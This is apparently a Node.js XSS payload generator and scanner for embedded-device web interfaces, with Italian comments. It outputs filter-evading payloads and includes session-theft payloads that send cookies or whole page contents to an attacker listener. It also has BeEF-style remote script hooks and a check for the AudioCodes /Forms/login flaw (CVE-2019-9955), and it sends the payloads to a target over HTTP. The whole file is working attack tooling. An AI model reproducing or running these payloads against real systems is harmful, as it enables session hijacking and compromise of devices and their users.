#!/usr/bin/env node
/**
 * xss_generator.js — XSS Payload Generator for Embedded Devices
 * Uso: node xss_generator.js [--target url] [--param fieldname] [--mode test|steal|exec]
 */

'use strict';

const http = require('http');
const https = require('https');
const url = require('url');
const querystring = require('querystring');

function parseArgs(argv) {
    const args = { target: null, param: 'username', mode: 'test', listener: null };
    for (let i = 2; i < argv.length; i++) {
        switch (argv[i]) {
            case '--target':   args.target   = argv[++i]; break;
            case '--param':    args.param    = argv[++i]; break;
            case '--mode':     args.mode     = argv[++i]; break;
            case '--listener': args.listener = argv[++i]; break;
            case '--help':
                console.log('Uso: node xss_generator.js [--target url] [--param field] [--mode test|steal|exec]');
                process.exit(0);
        }
    }
    return args;
}

// === Payload generators ===

function encodeHtmlEntities(s) {
    return s.replace(/[<>"'&]/g, c => ({
        '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#x27;', '&': '&amp;'
    }[c]));
}

function encodeUrl(s) { return encodeURIComponent(s); }

function encodeUnicode(s) {
    return [...s].map(c => `\\u${c.charCodeAt(0).toString(16).padStart(4, '0')}`).join('');
}

function encodeHex(s) {
    return [...s].map(c => `\\x${c.charCodeAt(0).toString(16).padStart(2, '0')}`).join('');
}

function encodeBase64(s) { return Buffer.from(s).toString('base64'); }

function generateTestPayloads() {
    const base = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg/onload=alert(1)>',
        'javascript:alert(1)',
        '"><script>alert(1)</script>',
        "'><script>alert(1)</script>",
        '<body onload=alert(1)>',
        '<iframe src="javascript:alert(1)">',
        '<input autofocus onfocus=alert(1)>',
        '<details open ontoggle=alert(1)>',
        '<math><mtext></math><script>alert(1)</script>',
        '<!--<img src="--><img src=x onerror=alert(1)">',
        '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>',
    ];

    const payloads = [];
    base.forEach(p => {
        payloads.push({ payload: p, encoding: 'raw', description: 'XSS raw' });
        payloads.push({ payload: encodeUrl(p), encoding: 'url', description: 'XSS URL encoded' });
        // HTML entity (per injection in contesto HTML attribute)
        const htmlEnc = p.replace(/"/g, '&quot;').replace(/'/g, '&#x27;');
        payloads.push({ payload: htmlEnc, encoding: 'html_entity', description: 'XSS HTML entity' });
    });

    // Unicode/hex per WAF bypass
    const simple = "alert(1)";
    payloads.push({
        payload: `<script>${encodeUnicode(simple)}</script>`,
        encoding: 'unicode', description: 'XSS unicode escaped'
    });
    payloads.push({
        payload: `<script>eval(atob('${encodeBase64(simple)}'))</script>`,
        encoding: 'base64', description: 'XSS base64 eval'
    });
    payloads.push({
        payload: `<script>eval("\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29")</script>`,
        encoding: 'hex', description: 'XSS hex escape'
    });

    // Embedded device specific (AudioCodes /Forms/login CVE-2019-9955)
    payloads.push({
        payload: `<img src=x onerror="this.src='http://127.0.0.1/?c='+document.cookie">`,
        encoding: 'raw', description: 'AudioCodes /Forms/login cookie steal (CVE-2019-9955 style)'
    });

    return payloads;
}

function generateStealPayloads(listener = 'http://192.168.1.100:8888') {
    return [
        {
            payload: `<script>new Image().src='${listener}/?cookie='+encodeURIComponent(document.cookie)</script>`,
            description: 'Cookie steal via Image'
        },
        {
            payload: `<img src=x onerror="fetch('${listener}/?c='+btoa(document.cookie))">`,
            description: 'Cookie steal via fetch + base64'
        },
        {
            payload: `<svg/onload="document.location='${listener}/?d='+document.cookie">`,
            description: 'Redirect con cookie'
        },
        {
            payload: `<script>document.write('<script src="${listener}/hook.js"></'+'script>')</script>`,
            description: 'External script inclusion (BeEF style)'
        },
        {
            payload: `<script>var x=new XMLHttpRequest();x.open('GET','${listener}/?s='+btoa(document.documentElement.outerHTML));x.send()</script>`,
            description: 'Full page exfil via XHR'
        },
        {
            payload: `"><script>new Image().src='${listener}/?c='+document.cookie</script>`,
            description: 'Break attribute + steal'
        },
        {
            payload: `<iframe onload="this.contentWindow.location='${listener}/?f='+encodeURIComponent(document.cookie)">`,
            description: 'iframe cookie steal'
        },
    ];
}

function generateExecPayloads() {
    // Payload per device con eval() JS o template injection
    return [
        {
            payload: `<script>eval('alert(document.domain)')</script>`,
            description: 'eval() domain check'
        },
        {
            payload: `{{7*7}}`,
            description: 'Template injection probe (SSTI)'
        },
        {
            payload: `${7*7}`,
            description: 'JS template literal injection'
        },
        {
            payload: `<script>window.onload=function(){var e=document.createElement('script');e.src='//attacker/x.js';document.head.appendChild(e)}</script>`,
            description: 'Dynamic script load'
        },
        {
            payload: `';alert(1);//`,
            description: 'JS string break'
        },
        {
            payload: `\`;alert(1);//`,
            description: 'Template literal break'
        },
    ];
}

// === HTTP test ===

function httpGet(rawUrl, timeoutMs = 8000) {
    return new Promise(resolve => {
        const parsed = url.parse(rawUrl);
        const lib = parsed.protocol === 'https:' ? https : http;
        const options = {
            hostname: parsed.hostname,
            port: parsed.port || (parsed.protocol === 'https:' ? 443 : 80),
            path: parsed.path,
            method: 'GET',
            headers: { 'User-Agent': 'exa-dune-xss-generator/1.0' },
            rejectUnauthorized: false,
            timeout: timeoutMs,
        };
        const req = lib.request(options, res => {
            let body = '';
            res.on('data', d => { body += d; if (body.length > 10000) res.destroy(); });
            res.on('end', () => resolve({ status: res.statusCode, body, headers: res.headers }));
        });
        req.on('error', e => resolve({ error: e.message }));
        req.on('timeout', () => { req.destroy(); resolve({ error: 'timeout' }); });
        req.end();
    });
}

async function testPayloads(targetUrl, param, payloads) {
    console.log(`\n[*] Test payload via HTTP: ${targetUrl}`);
    console.log(`    Parametro: ${param} | Payload count: ${payloads.length}`);

    for (const p of payloads) {
        const testUrl = `${targetUrl}?${param}=${encodeURIComponent(p.payload)}`;
        const result = await httpGet(testUrl);
        if (result.error) {
            continue;
        }
        const reflected = result.body && result.body.includes(p.payload);
        // Controlla reflection anche URL decoded
        const reflectedRaw = result.body && result.body.includes(
            p.payload.replace(/<script>/gi, '<script>'));

        if (reflected || reflectedRaw) {
            console.log(`[FOUND:CRITICAL] XSS RIFLESSO (${result.status}): ${p.description}`);
            console.log(`    URL: ${testUrl.slice(0, 100)}`);
        }
    }

    // Test specifico AudioCodes CVE-2019-9955
    if (targetUrl.includes('Forms/login') || targetUrl.includes('audiocodes')) {
        const xssPayload = '<script>alert(1)</script>';
        const cveUrl = targetUrl.replace(/\?.*$/, '') + `?username=${encodeURIComponent(xssPayload)}`;
        const r = await httpGet(cveUrl);
        if (r.body && r.body.includes(xssPayload)) {
            console.log(`[FOUND:CRITICAL] CVE-2019-9955: XSS confermato su /Forms/login`);
        }
    }
}

async function main() {
    const args = parseArgs(process.argv);
    const listener = args.listener || 'http://192.168.1.100:8888';

    console.log(`[*] XSS Payload Generator — Mode: ${args.mode}`);

    let payloads;
    let label;

    switch (args.mode) {
        case 'test':
            payloads = generateTestPayloads();
            label = 'Test XSS';
            break;
        case 'steal':
            payloads = generateStealPayloads(listener);
            label = 'Session Stealing';
            break;
        case 'exec':
            payloads = generateExecPayloads();
            label = 'Command Execution';
            break;
        default:
            console.error(`Modalità sconosciuta: ${args.mode}`);
            process.exit(1);
    }

    console.log(`\n[*] === ${label} Payloads (${payloads.length}) ===`);
    payloads.forEach((p, i) => {
        console.log(`\n[${i+1}] ${p.description || ''}${p.encoding ? ' [' + p.encoding + ']' : ''}`);
        console.log(`    ${p.payload}`);
    });

    // Test HTTP se target specificato
    if (args.target) {
        const testPl = payloads.map(p => ({ ...p, payload: p.payload }));
        await testPayloads(args.target, args.param, testPl);
    } else {
        console.log(`\n[*] Tip: usa --target <url> per testare i payload via HTTP`);
        console.log(`    Esempio: node xss_generator.js --target http://192.168.1.1/Forms/login --param username --mode test`);
    }
}

main().catch(e => {
    console.error(`[!] Errore: ${e.message}`);
    process.exit(1);
});
